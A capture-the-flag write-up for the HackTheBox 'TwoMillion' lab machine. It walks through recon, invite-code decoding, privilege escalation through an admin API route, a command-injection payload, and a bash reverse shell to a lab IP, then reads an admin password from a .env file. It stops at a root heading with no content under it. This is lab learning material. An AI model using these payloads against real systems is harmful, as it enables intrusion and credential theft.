# recon
- First i use **nmap -p- --min-rate=10000** 10.10.11.221 to check for open ports
- we got 2 ports open 22 and 80 we run nmap -sC -sV -p22,80 10.10.11.221
- after nmap we found port 80 has cookie  PHPSESSID: httponly flag not set
- we go check the site an no response only redirct to 2million.htb so we modify etc/hosts file with the ip to the site
- its a hackthebox site we run feroxbuster with command **feroxbuster -u http://2million.htb**
- we go check the login page i tryed admin@hackthebox.eu and password is password and we got usernotfound after several trys we also get user not found
- i try reflected xss from the url and its not working
- ![xss](https://github.com/Islamkafafy123/HackTheBox/blob/main/pictures/xss.jpg)
- we try the join page and it has an invite code page we solve it like the real hackthebox challange
- refresh and look in the network tap in the devolper tools we find its send request to inviteapi.min.js and thats intersting out of all the files displayed
- we go to depuuger to get the file and coppy it and beutify it
- after buetigying the code we see two function (makeinvitecode,verifyinvitecode)
- we put makeinvitecode in the console and we see date printed with encryption type ROT13
![makeinvitecode](https://github.com/Islamkafafy123/HackTheBox/blob/main/pictures/invitecode.jpg)
- we copy the data and go to cyperchef after decoding it says **In order to generate the invite code, make a POST request to /api/v1/invite/generate**
- we make post request using curl to the path **curl -X POST http://2million.htb/api/v1/invite/generate**
- we got code in base 64 after decoding **echo  V1pZRjgtRk9ETDktSDZSS1YtRTZQMVk= | base64 -d** we got it and use it to signup with email
- i try login with valid email and wrong passwor we still got usernotfound so we cant enumrate valid emails/username
- all links give server error except challnges and access page
- in access page there are 2 links (regenrate,coonectionpack)
- fireup burpsuite and send the 2 request to repeater and the 2 request gave the same response (VPN creds)
- i try playing with the directry /api/v1/user/vpn/generate from vpn adn all gave 404 or 301 except at /api/v1 it gave description of the api
# now we enumurate the api and exploit
- go to curl and  play with the routes (bruteforce))
- intersting api route /api/v1/admin/settings/update we could change user to admin
- so we go to the path /api/v1/admin/settings/update and we got 200 with messege invalid content type
- look at request and see no content type so we add one with json value **content-type : application/json** we send the request and its says missing parameter email
- we add the email parameter with our value in a json format and also is admin set to 1 and we got admin (idor vuln) we check we are admin with api route and yes we are admin
- It’s worth checking if there is any command injection.
- If the server is doing something like gen_vpn.sh [username], then I’ll try putting a ; in the username to break that into a new command. I’ll also add a # at the end to comment out anything that might come after my input. It works:
- we go to generate vpn with admin and yes it has command inj **{"username":"kafafy ; id #"}** using this payload we got the id command
- we try to get shell on the machine using bash reverse shell  **{"username":"kafafy ; bash -c 'bash -i >& /dev/tcp/10.10.16.63/1234 0>&1' #"}**
- we stablize the shell using --> **python3 -c 'import pty:pty.spawn("/bin/bash")'** --> **stty raw -echo;fg** --> **export TERM=xterm**
- .env is a file is commonly used in PHP applications to store environment variable values
- we cat the file and we got admin password we su to admin and we go the home directory to get the user.txt
# now ROOT SHELL
